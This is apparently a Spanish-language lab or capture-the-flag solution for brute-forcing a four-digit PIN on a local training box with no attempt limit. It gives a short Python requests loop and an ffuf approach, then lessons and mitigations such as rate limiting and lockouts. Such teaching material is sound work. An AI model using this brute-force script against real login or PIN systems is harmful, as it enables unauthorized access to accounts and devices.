## Solución

1. Envía un PIN cualquiera: la caja responde «PIN incorrecto» sin penalizarte. No hay bloqueo ni retardo.
2. El espacio es de solo 10 000 valores, así que se puede probar todo. Con un script:

   ```python
   import requests
   url = "http://<tu-sesion>.lab.localhost:8081/abrir"
   for n in range(10000):
       r = requests.post(url, data={"pin": f"{n:04d}"})
       if "CYBERLAB" in r.text:
           print(n, r.text)
           break
   ```

   O con `ffuf` y una lista de números del 0000 al 9999 (`seq -w 0 9999`), filtrando las respuestas que no sean «PIN incorrecto».

3. Una de las 10 000 respuestas abre la caja y muestra la bandera.

## Qué aprendiste

- La fuerza bruta funciona cuando hay pocas combinaciones y ningún freno.
- Automatizar peticiones es una habilidad básica: scripts, `curl` en un bucle, Burp Intruder, `ffuf`, `hydra`.
- Un secreto corto solo es seguro si el sistema limita los intentos.

## Cómo se evita

Limita los intentos por usuario y por origen, bloquea temporalmente tras varios fallos, agrega retardos crecientes, exige secretos más largos o un segundo factor, y monitorea los intentos fallidos.
